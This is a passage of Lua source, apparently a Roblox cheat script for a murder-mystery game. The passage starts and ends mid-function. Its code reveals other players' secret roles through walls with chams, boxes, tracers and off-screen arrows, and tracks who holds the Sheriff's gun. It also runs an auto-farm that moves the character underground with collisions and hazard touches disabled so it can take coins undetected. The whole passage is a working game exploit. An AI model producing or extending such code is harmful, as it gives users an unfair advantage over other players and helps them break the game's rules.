			func9(k)
		end

		func14()
	end

	_G.SheriffGunESPSetEnabled = function(sheriffGunESPEnabled)
		_G.SheriffGunESPEnabled = sheriffGunESPEnabled

		if sheriffGunESPEnabled then
			func12()
		else
			func10()
		end
	end

	_G.RoleNametagsSetEnabled = function(roleNametagsEnabled)
		_G.RoleNametagsEnabled = roleNametagsEnabled

		for k in pairs(tbl6) do
			func9(k)
		end

		func14()
	end

	_G.ESPNametagAvatar = true

	_G.ESPNametagAvatarSetEnabled = function(flag11)
		_G.ESPNametagAvatar = flag11 and true or false

		for k in pairs(tbl6) do
			func9(k)
		end

		func14()
	end

	_G.__RefreshRoleESP = function()
		for k in pairs(tbl6) do
			func9(k)
		end

		func14()
	end

	_G.ESPSetStyle = function(flag12)
		_G.ESPStyle = (flag12 == "Neon" or flag12 == "Pulse") and flag12 or "Classic"
		_G.__RefreshRoleESP()
	end

	_G.ESPChams = true
	_G.ESPBoxes = true
	_G.ESPTracers = false
	_G.ESPTracerOrigin = "Bottom"
	_G.ESPDistance = false
	_G.ESPArrows = true
	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "MarbegESPOverlay"
	screenGui.ResetOnSpawn = false
	screenGui.IgnoreGuiInset = true
	screenGui.DisplayOrder = 5
	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	screenGui.Parent = func2()
	_G.ESPOverlayGui = screenGui
	local tbl8 = {}
	local color = Color3.new(1, 1, 1)

	local function createBillboardGui(backgroundColor3, adornee)
		local billboardGui = Instance.new("BillboardGui")
		billboardGui.Name = "MarbegAura"
		billboardGui.Adornee = adornee
		billboardGui.Size = UDim2.new(5.5, 0, 7.5, 0)
		billboardGui.StudsOffset = Vector3.new(0, 0.3, -0.6)
		billboardGui.LightInfluence = 0
		billboardGui.Brightness = 2
		billboardGui.AlwaysOnTop = false
		billboardGui.AutoLocalize = false

		for i = 1, 10 do
			local frame = Instance.new("Frame")
			local n = 1 - (i - 1) * 0.07
			frame.AnchorPoint = Vector2.new(0.5, 0.5)
			frame.Position = UDim2.fromScale(0.5, 0.5)
			frame.Size = UDim2.fromScale(n, n)
			frame.BackgroundColor3 = backgroundColor3
			frame.BackgroundTransparency = 0.945
			frame.BorderSizePixel = 0
			Instance.new("UICorner", frame).CornerRadius = UDim.new(1, 0)
			frame.Parent = billboardGui
		end

		billboardGui.Parent = folder
		return billboardGui
	end

	local function func15()
		local frame = Instance.new("Frame")
		frame.Name = "Box"
		frame.BackgroundTransparency = 0.92
		frame.BorderSizePixel = 0
		frame.Visible = false
		frame.Parent = screenGui
		Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 3)
		local uiStroke = Instance.new("UIStroke")
		uiStroke.Thickness = 1.6
		uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		uiStroke.Parent = frame
		local frame2 = Instance.new("Frame")
		frame2.AnchorPoint = Vector2.new(0.5, 0.5)
		frame2.Position = UDim2.fromScale(0.5, 0.5)
		frame2.Size = UDim2.new(1, -3, 1, -3)
		frame2.BackgroundTransparency = 1
		frame2.Parent = frame
		Instance.new("UICorner", frame2).CornerRadius = UDim.new(0, 2)
		local uiStroke2 = Instance.new("UIStroke")
		uiStroke2.Thickness = 1
		uiStroke2.Color = Color3.new(0, 0, 0)
		uiStroke2.Transparency = 0.5
		uiStroke2.Parent = frame2
		local frame3 = Instance.new("Frame")
		frame3.Name = "Tracer"
		frame3.AnchorPoint = Vector2.new(0.5, 0.5)
		frame3.BorderSizePixel = 0
		frame3.Visible = false
		frame3.Parent = screenGui
		local uiStroke3 = Instance.new("UIStroke")
		uiStroke3.Thickness = 0.6
		uiStroke3.Color = Color3.new(0, 0, 0)
		uiStroke3.Transparency = 0.6
		uiStroke3.Parent = frame3
		local frame4 = Instance.new("Frame")
		frame4.Name = "Arrow"
		frame4.AnchorPoint = Vector2.new(0.5, 0.5)
		frame4.Size = UDim2.fromOffset(26, 26)
		frame4.BackgroundTransparency = 1
		frame4.Visible = false
		frame4.Parent = screenGui
		local uiScale = Instance.new("UIScale")
		uiScale.Parent = frame4
		local list4 = {}

		for _, item6 in ipairs({ 40, -40 }) do
			local value13 = math.rad(item6)
			local sin = math.sin
			local n = Vector2.new(24, 13) - Vector2.new(math.cos(value13), sin(value13)) * 7.5
			local frame5 = Instance.new("Frame")
			frame5.AnchorPoint = Vector2.new(0.5, 0.5)
			frame5.Position = UDim2.fromOffset(n.X, n.Y)
			frame5.Size = UDim2.fromOffset(15, 4)
			frame5.Rotation = item6
			frame5.BorderSizePixel = 0
			frame5.Parent = frame4
			Instance.new("UICorner", frame5).CornerRadius = UDim.new(1, 0)
			local uiStroke4 = Instance.new("UIStroke")
			uiStroke4.Color = Color3.new(0, 0, 0)
			uiStroke4.Thickness = 1
			uiStroke4.Transparency = 0.35
			uiStroke4.Parent = frame5
			list4[#list4 + 1] = frame5
		end

		local textLabel = Instance.new("TextLabel")
		textLabel.Name = "ArrowDistance"
		textLabel.AnchorPoint = Vector2.new(0.5, 0)
		textLabel.Size = UDim2.fromOffset(60, 14)
		textLabel.BackgroundTransparency = 1
		textLabel.Font = Enum.Font.GothamBold
		textLabel.TextSize = 11
		textLabel.TextStrokeTransparency = 0.3
		textLabel.Visible = false
		textLabel.Parent = screenGui
		return { box = frame, stroke = uiStroke, line = frame3, arrow = frame4, arrowScale = uiScale, bars = list4, tag = textLabel }
	end

	local function func16(param15)
		local entry3 = tbl8[param15]

		if entry3 then
			pcall(function()
				entry3.box:Destroy()
			end)

			pcall(function()
				entry3.line:Destroy()
			end)

			pcall(function()
				entry3.arrow:Destroy()
			end)

			pcall(function()
				entry3.tag:Destroy()
			end)

			tbl8[param15] = nil
		end
	end

	local tbl9 = { { scale = 1.14, transparency = 0.6, whiten = 0.12 } }

	local function shellCopy(obj1, num5)
		local archivable = obj1.Archivable
		obj1.Archivable = true

		local ok, result = pcall(function()
			return obj1:Clone()
		end)

		obj1.Archivable = archivable
		if not ok or not result then
			return nil
		end
		local value14 = nil

		for _, child in ipairs(result:GetChildren()) do
			if child:IsA("SpecialMesh") then
				value14 = child
			else
				child:Destroy()
			end
		end

		result.Name = "MarbegChamsPart"
		result.Material = Enum.Material.Neon
		result.Anchored = true
		result.CanCollide = false
		result.CanQuery = false
		result.CanTouch = false
		result.CastShadow = false
		result.Massless = true

		pcall(function()
			result.TextureID = ""
		end)

		if value14 then
			value14.TextureId = ""

			if value14.MeshType == Enum.MeshType.FileMesh then
				value14.Scale = value14.Scale * num5
			else
				result.Size = result.Size * num5
			end
		else
			result.Size = result.Size * num5
		end

		return result
	end

	_G.__ShellCopy = shellCopy

	local function func17(list5, obj2)
		local folder2 = Instance.new("Folder")
		folder2.Name = "MarbegChams"
		folder2.Parent = workspace.CurrentCamera
		local list6 = {}

		for _, descendant in ipairs(list5:GetDescendants()) do
			if descendant:IsA("BasePart") and descendant.Name ~= "HumanoidRootPart" and descendant.Transparency < 0.9 then
				for _, item7 in ipairs(tbl9) do
					local value15 = shellCopy(descendant, item7.scale)

					if value15 then
						value15.Transparency = item7.transparency
						value15.Color = obj2:Lerp(color, item7.whiten)
						value15.CFrame = descendant.CFrame
						value15.Parent = folder2
						list6[#list6 + 1] = { part = descendant, copy = value15, spec = item7 }
					end
				end
			end
		end

		return {
			folder = folder2,
			shells = list6,
			character = list5,
			color = obj2,
			count = #list5:GetDescendants(),
			checkedAt = os.clock(),
		}
	end

	local n = 0

	RunService:BindToRenderStep("MarbegESPOverlay", Enum.RenderPriority.Camera.Value + 1, function()
		local currentCamera = workspace.CurrentCamera
		if not currentCamera then
			return
		end
		local now = os.clock()
		local n2 = (math.sin(now * 3.2) + 1) / 2
		local espStyle = _G.ESPStyle
		local num6 = now - n > 0.15

		if num6 then
			n = now
		end

		local viewportSize = currentCamera.ViewportSize
		local position = currentCamera.CFrame.Position
		local tbl10 = {}
		local list7 = {}
		local list8 = {}

		for k, value16 in pairs(tbl6) do
			local character = value16.character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			local highlight = value16.highlight

			if humanoidRootPart and highlight and highlight.Parent then
				tbl10[k] = true
				local obj3 = roleColors[value16.role] or color

				if espStyle ~= "Classic" and _G.ESPFillEnabled and not _G.ESPChams then
					local value17, value18, num7 = _G.__ESPLook(value16.role)
					highlight.FillTransparency = math.clamp(num7 + (espStyle == "Neon" and 0.2 or 0.45) * n2, 0, 1)
				end

				if espStyle == "Neon" then
					if not value16.aura or value16.aura.Parent ~= folder or value16.aura.Adornee ~= humanoidRootPart then
						if value16.aura then
							pcall(function()
								value16.aura:Destroy()
							end)
						end

						value16.aura = createBillboardGui(obj3, humanoidRootPart)
					end

					local n3 = 1 + 0.1 * n2
					value16.aura.Size = UDim2.new(5.5 * n3, 0, 7.5 * n3, 0)
				elseif value16.aura then
					pcall(function()
						value16.aura:Destroy()
					end)

					value16.aura = nil
				end

				if _G.ESPChams then
					local chams = value16.chams
					local flag13 = not chams or chams.character ~= character or not chams.folder.Parent

					if chams and not flag13 and now - chams.checkedAt > 1 then
						chams.checkedAt = now
						local count = chams.count
						flag13 = #character:GetDescendants() ~= count
					end

					if flag13 then
						if chams then
							pcall(function()
								chams.folder:Destroy()
							end)
						end

						chams = func17(character, obj3)
						value16.chams = chams
					end

					if chams.color ~= obj3 then
						chams.color = obj3

						for _, shell in ipairs(chams.shells) do
							shell.copy.Color = obj3:Lerp(color, shell.spec.whiten)
						end
					end

					for _, shell in ipairs(chams.shells) do
						if shell.part.Parent then
							list7[#list7 + 1] = shell.copy
							list8[#list8 + 1] = shell.part.CFrame
						end
					end
				elseif value16.chams then
					pcall(function()
						value16.chams.folder:Destroy()
					end)

					value16.chams = nil
				end

				if num6 and value16.billboard and value16.player then
					local playerName = value16.billboard:FindFirstChild("PlayerName", true)

					if playerName then
						playerName.Text = _G.ESPDistance and string.format("%s  %dm", value16.player.Name, math.floor((position - humanoidRootPart.Position).Magnitude)) or value16.player.Name
					end
				end

				local entry4 = tbl8[k]

				if _G.ESPBoxes or _G.ESPTracers or _G.ESPArrows then
					if not entry4 then
						entry4 = func15()
						tbl8[k] = entry4
					end

					local head = character:FindFirstChild("Head")
					local num8 = currentCamera:WorldToViewportPoint((head and head.Position or humanoidRootPart.Position + Vector3.new(0, 1.5, 0)) + Vector3.new(0, 0.9, 0))
					local value19 = currentCamera:WorldToViewportPoint(humanoidRootPart.Position - Vector3.new(0, 3.1, 0))
					local flag14 = num8.Z > 0 and value19.Z > 0

					if _G.ESPBoxes and flag14 then
						local n3 = math.max(4, value19.Y - num8.Y)
						local n4 = n3 * 0.58
						entry4.box.Position = UDim2.fromOffset(num8.X - n4 / 2, num8.Y)
						entry4.box.Size = UDim2.fromOffset(n4, n3)
						entry4.box.BackgroundColor3 = obj3
						entry4.stroke.Color = obj3
						entry4.box.Visible = true
					else
						entry4.box.Visible = false
					end

					if _G.ESPTracers and flag14 then
						local vector2 = Vector2.new(viewportSize.X / 2, _G.ESPTracerOrigin == "Center" and viewportSize.Y / 2 or _G.ESPTracerOrigin == "Top" and 0 or viewportSize.Y)
						local vector22 = Vector2.new(value19.X, value19.Y)
						local n3 = vector22 - vector2
						entry4.line.Position = UDim2.fromOffset((vector2.X + vector22.X) / 2, (vector2.Y + vector22.Y) / 2)
						entry4.line.Size = UDim2.fromOffset(n3.Magnitude, 1.5)
						entry4.line.Rotation = math.deg(math.atan2(n3.Y, n3.X))
						entry4.line.BackgroundColor3 = obj3
						entry4.line.BackgroundTransparency = 0.15
						entry4.line.Visible = true
					else
						entry4.line.Visible = false
					end

					local value20 = currentCamera:WorldToViewportPoint(humanoidRootPart.Position)

					if _G.ESPArrows and not (value20.Z > 0 and value20.X >= 0 and value20.X <= viewportSize.X and value20.Y >= 0 and value20.Y <= viewportSize.Y) then
						local num9 = currentCamera.CFrame:PointToObjectSpace(humanoidRootPart.Position)
						local vector2 = Vector2.new(num9.X, -num9.Y)
						local unit = vector2.Magnitude > 0.001 and vector2.Unit or Vector2.new(0, 1)
						local n3 = viewportSize / 2
						local max = math.max
						local n4 = n3.Y - 70
						local vector22 = Vector2.new(math.max(n3.X - 70, 40), max(n4, 40))
						local n5 = n3 + Vector2.new(unit.X * vector22.X, unit.Y * vector22.Y)
						local scale = value16.role == "Murderer" and 1 + 0.15 * n2 or 1
						entry4.arrow.Position = UDim2.fromOffset(n5.X, n5.Y)
						entry4.arrow.Rotation = math.deg(math.atan2(unit.Y, unit.X))
						entry4.arrowScale.Scale = scale

						for _, bar in ipairs(entry4.bars) do
							bar.BackgroundColor3 = obj3
						end

						entry4.arrow.Visible = true
						entry4.tag.Position = UDim2.fromOffset(n5.X, n5.Y + 15)
						entry4.tag.TextColor3 = obj3
						entry4.tag.Text = string.format("%dm", math.floor((position - humanoidRootPart.Position).Magnitude))
						entry4.tag.Visible = true
					else
						entry4.arrow.Visible = false
						entry4.tag.Visible = false
					end
				elseif entry4 then
					func16(k)
				end
			end
		end

		if #list7 > 0 then
			workspace:BulkMoveTo(list7, list8, Enum.BulkMoveMode.FireCFrameChanged)
		end

		for k in pairs(tbl8) do
			if not tbl10[k] then
				func16(k)
			end
		end
	end)

	_G.ESPChamsSetEnabled = function(flag15)
		_G.ESPChams = flag15 and true or false
		_G.__RefreshRoleESP()
	end

	_G.ESPBoxesSetEnabled = function(flag16)
		_G.ESPBoxes = flag16 and true or false
	end

	_G.ESPTracersSetEnabled = function(flag17)
		_G.ESPTracers = flag17 and true or false
	end

	_G.ESPDistanceSetEnabled = function(flag18)
		_G.ESPDistance = flag18 and true or false
	end

	_G.ESPArrowsSetEnabled = function(flag19)
		_G.ESPArrows = flag19 and true or false
	end

	_G.ESPTracerSetOrigin = function(espTracerOrigin)
		_G.ESPTracerOrigin = espTracerOrigin
	end

	local roleRefreshBurstId = {}
	_G.__RoleRefreshBurstId = roleRefreshBurstId

	local function func18()
		if _G.__RoleRefreshBurstId ~= roleRefreshBurstId then
			return
		end
		pcall(func14)

		for _, item8 in ipairs({ 0.03, 0.1, 0.25 }) do
			task.delay(item8, function()
				if _G.__RoleRefreshBurstId == roleRefreshBurstId then
					pcall(func14)
				end
			end)
		end
	end

	table.insert(_G.CoinESPConn, CurrentRoundClient.PlayerDataChanged.Event:Connect(function()
		for _, value21 in pairs(CurrentRoundClient.PlayerData) do
			value21 = value21 and value21.Role

			if value21 then
				_G.__RealInRound = true
				_G.InRound = true
				break
			end
		end

		func18()
	end))

	table.insert(_G.CoinESPConn, gameplay.RoundStart.OnClientEvent:Connect(function()
		_G.__HeroOverride = {}
		_G.__HeroTiming = {}
		_G.__RealInRound = true
		_G.InRound = true
		func18()
	end))

	table.insert(_G.CoinESPConn, gameplay.GameOver.OnClientEvent:Connect(function()
		_G.__HeroOverride = {}
		_G.__RealInRound = false
		_G.InRound = false

		for k in pairs(tbl6) do
			func9(k)
		end

		func10()
		func18()
	end))

	local function func19(player3)
		table.insert(_G.CoinESPConn, player3.CharacterAdded:Connect(function()
			task.defer(func14)
		end))

		table.insert(_G.CoinESPConn, player3.CharacterRemoving:Connect(function()
			func9(player3.UserId)
			task.defer(func14)
		end))
	end

	for _, player in ipairs(Players:GetPlayers()) do
		func19(player)
	end

	table.insert(_G.CoinESPConn, Players.PlayerAdded:Connect(function(player)
		func19(player)
		task.defer(func14)
	end))

	table.insert(_G.CoinESPConn, Players.PlayerRemoving:Connect(function(player)
		func9(player.UserId)
		task.defer(func14)
	end))

	table.insert(_G.CoinESPConn, workspace.DescendantAdded:Connect(function(descendant)
		if _G.__IsDroppedGunInstance(descendant) then
			_G.__CachedDroppedGun = descendant
			task.defer(func12)
		elseif descendant.Name == "Gun" and descendant:IsA("Tool") and Players:GetPlayerFromCharacter(descendant.Parent) then
			local playerFromCharacter = Players:GetPlayerFromCharacter(descendant.Parent)

			if playerFromCharacter and not _G.__HeroTiming[playerFromCharacter.Name] then
				_G.__HeroTiming[playerFromCharacter.Name] = { seen = os.clock(), how = "equipped" }
			end

			task.defer(func14)
		end
	end))

	table.insert(_G.CoinESPConn, workspace.DescendantRemoving:Connect(function(descendant)
		if _G.__CachedDroppedGun == descendant and _G.InRound then
			local ok, result = pcall(function()
				return descendant:IsA("BasePart") and descendant.Position or descendant:GetPivot().Position
			end)

			if ok and result then
				local n2 = 10
				local value22 = nil

				for _, player in ipairs(Players:GetPlayers()) do
					local flag20 = CurrentRoundClient.PlayerData[player.Name]
					local humanoidRootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")

					if flag20 and flag20.Role == "Innocent" and not flag20.Dead and humanoidRootPart then
						local magnitude = (humanoidRootPart.Position - result).Magnitude

						if magnitude < n2 then
							n2 = magnitude
							value22 = player
						end
					end
				end

				if value22 then
					_G.__HeroOverride[value22.Name] = true

					if not _G.__HeroTiming[value22.Name] then
						_G.__HeroTiming[value22.Name] = { seen = os.clock(), how = "picked up" }
					end

					task.defer(func14)
				end
			end
		end

		if _G.__CachedDroppedGun == descendant then
			_G.__CachedDroppedGun = nil
		end

		if flag3 and flag3.adornee == descendant then
			task.defer(func10)
		end
	end))

	local roleRescanLoopId = {}
	_G.__RoleRescanLoopId = roleRescanLoopId

	task.spawn(function()
		while _G.__RoleRescanLoopId == roleRescanLoopId do
			task.wait(_G.PerformanceMode and _G.AutoFarmEnabled and 0.5 or 0.25)
			pcall(func14)
		end
	end)
end

print("Core systems (coin registry + role esp) ready")
_G.AutoFarmEnabled = false
_G.AutoFarmSpeed = 25
_G.CollectCoinsUnderground = true
local connection
connection = nil
local flag21
flag21 = nil
local value23
value23 = nil
local flag22
flag22 = nil
local n
n = 0.066
local value24
value24 = nil
local hipHeight, alignPosition

do
	local n2 = 350
	local n3 = 2.5
	local n4 = 1.25
	local n5 = 2
	local n6 = 2
	local n7 = 0.25
	hipHeight = nil
	local tbl11 = {}
	local value25 = nil
	local connection2 = nil
	local connection3 = nil
	local attachment = nil
	alignPosition = nil
	local alignOrientation = nil
	local part = nil
	local connection4 = nil
	local value26 = nil
	local value27 = nil
	local n8 = nil
	local size = nil
	local flag23 = false
	local value28 = nil
	local flag24 = false
	local value29 = nil
	local flag25 = true
	local tbl12 = {}
	local n9 = 0
	local connection5 = nil
	local tbl13 = { "water", "lava", "acid", "poison", "drown", "deadly", "hazard", "void" }

	local function func20(instance4)
		if not instance4:IsA("BasePart") then
			return false
		end

		if instance4.Material == Enum.Material.Water then
			return true
		end
		local lowered2 = string.lower(instance4.Name)

		for _, item9 in ipairs(tbl13) do
			if string.find(lowered2, item9, 1, true) then
				return true
			end
		end

		for _, child in ipairs(instance4:GetChildren()) do
			local lowered3 = string.lower(child.Name)
			if lowered3 == "waterclient" or lowered3 == "hitwater" or string.find(lowered3, "damage", 1, true) or string.find(lowered3, "kill", 1, true) or string.find(lowered3, "drown", 1, true) then
				return true
			end
		end

		return false
	end

	_G.__FarmInTerrainWater = function(num10)
		local ok, result = pcall(function()
			local tbl14 = workspace.Terrain:ReadVoxels(Region3.new(num10 - Vector3.new(2, 2, 2), num10 + Vector3.new(2, 2, 2)):ExpandToGrid(4), 4)
			local size2 = tbl14.Size

			for i = 1, size2.X do
				for i2 = 1, size2.Y do
					for i3 = 1, size2.Z do
						if tbl14[i][i2][i3] == Enum.Material.Water then
							return true
						end
					end
				end
			end

			return false
		end)

		return ok and result
	end

	_G.__FarmDangerZones = _G.__FarmDangerZones or {}

	_G.__FarmAddDanger = function(param16)
		if typeof(param16) ~= "Vector3" then
			return
		end
		table.insert(_G.__FarmDangerZones, { position = param16, expires = tick() + 240 })
	end

	_G.__FarmNearDanger = function(num11, flag26)
		local farmDangerZones = _G.__FarmDangerZones
		local now = tick()

		for i = #farmDangerZones, 1, -1 do
			local entry5 = farmDangerZones[i]
			if now > entry5.expires then
				table.remove(farmDangerZones, i)
				continue
			end

			if not ((entry5.position - num11).Magnitude <= (flag26 or 20)) then
				continue
			end
			return true
		end

		return false
	end

	local function func21(descendant)
		local isBasePart = descendant:IsA("BasePart") and descendant or descendant.Parent
		if not isBasePart or not isBasePart:IsA("BasePart") or not func20(isBasePart) then
			return
		end

		if tbl12[isBasePart] == nil then
			tbl12[isBasePart] = isBasePart.CanTouch
		end

		pcall(function()
			isBasePart.CanTouch = false
		end)
	end

	local function func22(flag27)
		if not flag27 and tick() - n9 > 15 then
			flag27 = true
		end

		if not flag27 and tick() - n9 < 2 then
			return
		end
		n9 = tick()

		if flag27 then
			local tbl15 = {}

			for _, player in ipairs(Players:GetPlayers()) do
				if player.Character then
					tbl15[player.Character] = true
				end
			end

			local n10 = 0

			for _, child in ipairs(workspace:GetChildren()) do
				if not tbl15[child] and not child:IsA("Terrain") and not child:IsA("Camera") then
					for _, descendant in ipairs(child:GetDescendants()) do
						func21(descendant)
						n10 += 1

						if n10 % 400 == 0 then
							RunService.Heartbeat:Wait()
						end
					end
				end
			end
		end

		for k in pairs(tbl12) do
			if not k.Parent then
				tbl12[k] = nil
			else
				pcall(function()
					k.CanTouch = false
				end)
			end
		end
	end

	local function func23()
		for k, value30 in pairs(tbl12) do
			if k.Parent then
				pcall(function()
					k.CanTouch = value30
				end)
			end
		end

		table.clear(tbl12)
	end

	local function func24(param17, param18)
		for k in pairs(tbl12) do
			if k.Parent then
				local value31 = k.CFrame:PointToObjectSpace(param17)
				local n10 = k.Size * 0.5 + Vector3.new(param18, param18, param18)
				local x = n10.X
				local flag28 = math.abs(value31.X) <= x

				if flag28 then
					local y = n10.Y
					flag28 = math.abs(value31.Y) <= y
				end

				if flag28 then
					local z = n10.Z
					flag28 = math.abs(value31.Z) <= z
				end

				if flag28 then
					return true
				end
			end
		end

		return false
	end

	local function func25(num12, num13)
		local n10 = num13 - num12
		local n11 = math.clamp(math.ceil(n10.Magnitude / 3), 1, 60)

		for i = 0, n11 do
			if func24(num12 + n10 * i / n11, 3) then
				return true
			end
		end

		for i = 0, 4 do
			if _G.__FarmInTerrainWater(num12 + n10 * i / 4) then
				return true
			end
		end

		return false
	end

	local function func26(list9, part3)
		local n10 = 3

		for _, descendant in ipairs(list9:GetDescendants()) do
			if descendant:IsA("BasePart") then
				n10 = math.max(n10, descendant.Position.Y + descendant.Size.Y * 0.5 - part3.Position.Y)
			end
		end

		n8 = math.clamp(n10, 2.5, 4)
	end

	local function func27(param19)
		return Vector3.new(param19.X, param19.Y - (n8 or 3) - n6, param19.Z)
	end

	local function func28(param20)
		if _G.CollectCoinsUnderground then
			return func27(param20)
		end
		local character = localPlayer.Character
		local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
		character = character and character:FindFirstChild("HumanoidRootPart")
		return Vector3.new(param20.X, param20.Y + (humanoid and character and math.max(2.5, humanoid.HipHeight + character.Size.Y * 0.5) or 3), param20.Z)
	end

	local function func29(param21)
		if not size then
			size = param21.Size
		end

		local max = math.max
		local y = size.Y
		local n10 = n8 or 3
		local z = size.Z
		param21.Size = Vector3.new(size.X, max(y, n10 + n6 + 1) * 2, z)
	end

	local function func30()
		local character = localPlayer.Character
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

		if humanoidRootPart and size then
			pcall(function()
				humanoidRootPart.Size = size
			end)
		end

		size = nil
	end

	local function func31(param22, part4, param23, flag29)
		local raycastParams = RaycastParams.new()
		raycastParams.FilterType = Enum.RaycastFilterType.Exclude
		raycastParams.FilterDescendantsInstances = { param22 }
		raycastParams.IgnoreWater = false
		local hit = workspace:Raycast(part4.Position, Vector3.new(0, 50, 0), raycastParams)
		local n10 = math.max(3, param23.HipHeight + part4.Size.Y * 0.5)
		if hit and hit.Material ~= Enum.Material.Water and not func20(hit.Instance) then
			return hit.Position + Vector3.new(0, n10 + 0.25, 0)
		end
		return Vector3.new(part4.Position.X, (flag29 and flag29.Y or part4.Position.Y + 8) + n10, part4.Position.Z)
	end

	local function func32()
		if connection2 then
			connection2:Disconnect()
			connection2 = nil
		end

		if connection3 then
			connection3:Disconnect()
			connection3 = nil
		end

		for k, value32 in pairs(tbl11) do
			if k.Parent then
				pcall(function()
					k.CanCollide = value32
				end)
			end
		end

		table.clear(tbl11)
		value25 = nil
	end

	local function func33(instance5)
		if not instance5:IsA("BasePart") then
			return
		end

		if tbl11[instance5] == nil then
			tbl11[instance5] = instance5.CanCollide
		end

		instance5.CanCollide = false
	end

	local function func34(list10, flag30)
		if not flag30 then
			func32()
			return
		end

		if value25 == list10 then
			return
		end
		func32()
		value25 = list10

		for _, descendant in ipairs(list10:GetDescendants()) do
			func33(descendant)
		end

		connection2 = list10.DescendantAdded:Connect(function(descendant)
			if descendant:IsA("BasePart") then
				task.defer(func33, descendant)
			end
		end)

		connection3 = RunService.PreSimulation:Connect(function()
			for k in pairs(tbl11) do
				if k.Parent and k.CanCollide then
					k.CanCollide = false
				end
			end
		end)
	end

	local function func35(parent)
		if alignPosition and alignPosition.Parent then
			return
		end
		attachment = Instance.new("Attachment")
		attachment.Name = "MarbegFlightAttach"
		attachment.Parent = parent
		alignPosition = Instance.new("AlignPosition")
		alignPosition.Name = "MarbegFlightAlign"
		alignPosition.Mode = Enum.PositionAlignmentMode.OneAttachment
		alignPosition.Attachment0 = attachment
		alignPosition.ApplyAtCenterOfMass = true
		alignPosition.RigidityEnabled = false
		alignPosition.MaxForce = 500000
		alignPosition.Responsiveness = 18
		alignPosition.MaxVelocity = _G.AutoFarmSpeed
		alignPosition.Position = parent.Position
		alignPosition.Parent = parent
		alignOrientation = Instance.new("AlignOrientation")
		alignOrientation.Name = "MarbegUprightAlign"
		alignOrientation.Mode = Enum.OrientationAlignmentMode.OneAttachment
		alignOrientation.Attachment0 = attachment
		alignOrientation.CFrame = parent.CFrame - parent.CFrame.Position
		alignOrientation.RigidityEnabled = false
		alignOrientation.MaxTorque = 500000
		alignOrientation.MaxAngularVelocity = 10
		alignOrientation.Responsiveness = 12
		alignOrientation.Parent = parent
	end

	local function func36()
		if alignPosition then
			pcall(function()
				alignPosition:Destroy()
			end)

			alignPosition = nil
		end

		if alignOrientation then
			pcall(function()
				alignOrientation:Destroy()
			end)

			alignOrientation = nil
		end

		if attachment then
			pcall(function()
				attachment:Destroy()
			end)

			attachment = nil
		end
	end

	local function func37(cameraSubject)
		if connection4 then
			connection4:Disconnect()
			connection4 = nil
		end

		local currentCamera = workspace.CurrentCamera

		if currentCamera and part and currentCamera.CameraSubject == part and cameraSubject then
			currentCamera.CameraType = Enum.CameraType.Custom
			currentCamera.CameraSubject = cameraSubject
		end

		if part then
			pcall(function()
				part:Destroy()
			end)
		end

		part = nil
		value26 = nil
	end

	local function func38(part5, num14)
		if not _G.CollectCoinsUnderground then
			func37(value23)
			return
		end

		if not part or not part.Parent then
			part = Instance.new("Part")
			part.Name = "MarbegFarmCameraProxy"
			part.Size = Vector3.one
			part.Transparency = 1
			part.Anchored = true
			part.CanCollide = false
			part.CanTouch = false
			part.CanQuery = false
			part.Parent = workspace
			value26 = num14
			part.Position = Vector3.new(part5.Position.X, num14 + 3.5, part5.Position.Z)

			if connection4 then
				connection4:Disconnect()
			end

			connection4 = RunService.RenderStepped:Connect(function(deltaTime)
				if not part or not part.Parent or not flag22 or not flag22.Parent then
					return
				end
				local position = part.Position
				local n10 = (value26 or flag22.Position.Y) + 3.5
				local n11 = 1 - math.exp(-18 * math.min(deltaTime, 0.1))
				part.Position = Vector3.new(position.X + (flag22.Position.X - position.X) * n11, position.Y + (n10 - position.Y) * (1 - math.exp(-7 * math.min(deltaTime, 0.1))), position.Z + (flag22.Position.Z - position.Z) * n11)
			end)
		end

		value27 = num14
		value26 = num14
		local currentCamera = workspace.CurrentCamera

		if currentCamera then
			currentCamera.CameraType = Enum.CameraType.Custom
			currentCamera.CameraSubject = part
		end
	end

	local function func39(flag31)
		if connection then
			connection:Disconnect()
			connection = nil
		end

		if connection5 then
			connection5:Disconnect()
			connection5 = nil
		end

		local character = flag21 or localPlayer.Character

		if character then
			local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

			if flag31 ~= false and humanoidRootPart and part and value27 then
				local n10 = humanoidRootPart.CFrame - humanoidRootPart.CFrame.Position

				pcall(function()
					character:PivotTo(CFrame.new(humanoidRootPart.Position.X, value27 + 3, humanoidRootPart.Position.Z) * n10)
				end)
			end

			pcall(func34, character, false)
			local humanoid = character:FindFirstChildWhichIsA("Humanoid")

			if humanoid then
				func37(humanoid)
				humanoid.PlatformStand = false

				if hipHeight then
					humanoid.HipHeight = hipHeight
				end
			end
		end

		func36()
		func30()
		func23()
		flag23 = false
		value28 = nil
		flag24 = false
		value29 = nil
		idleHoldPosition = nil
		value27 = nil
		flag21 = nil
		value23 = nil
		flag22 = nil
	end

	local tbl16 = {}
	local tbl17 = {}
	local tbl18 = {}
	local tbl19 = {}
	local tbl20 = {}
	local value33 = nil
	local position = nil

	local function func40(num15)
		local now = tick()

		for k, value34 in pairs(tbl16) do
			if now > value34 or not k.Parent then
				tbl16[k] = nil
			end
		end

		if not _G.GetAllCoinCandidates then
			return nil, nil, nil
		end
		local value35 = _G.GetAllCoinCandidates(num15)
		local list11 = {}

		for _, item10 in ipairs(value35) do
			local value36 = func28(item10.pos)

			if not tbl16[item10.part] and item10.dist <= n2 and not func24(item10.pos, 3) and not func24(value36, 4) and not func25(num15, value36) and not _G.__FarmNearDanger(item10.pos, 20) and not _G.__FarmNearDanger(value36, 20) then
				list11[#list11 + 1] = { part = item10.part, pos = item10.pos, dist = item10.dist, goal = value36, weight = item10.weight or 1 }
			end

			if not (#list11 >= 12) then
				continue
			end
			break
		end

		local huge = math.huge
		local value37 = nil

		for _, item11 in ipairs(list11) do
			local n10 = 0

			for _, item12 in ipairs(value35) do
				if item12.part ~= item11.part and (item12.pos - item11.pos).Magnitude <= 28 then
					n10 += 1
				end
			end

